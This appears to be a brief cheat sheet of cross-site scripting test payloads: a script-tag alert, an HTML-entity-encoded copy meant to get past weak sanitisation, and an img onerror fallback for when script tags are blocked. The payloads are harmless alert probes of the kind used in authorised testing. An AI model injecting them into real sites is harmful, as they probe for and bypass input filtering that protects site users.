// basic injection
<script type="text/javascript">alert(0);</script>

// try to get around poor sanitation
&lt;script type="text/javascript"&gt;alert(0);&lt;/script&gt;

// won't let me in with script tag?
<img src="zzz" onerror="alert(0);"/>
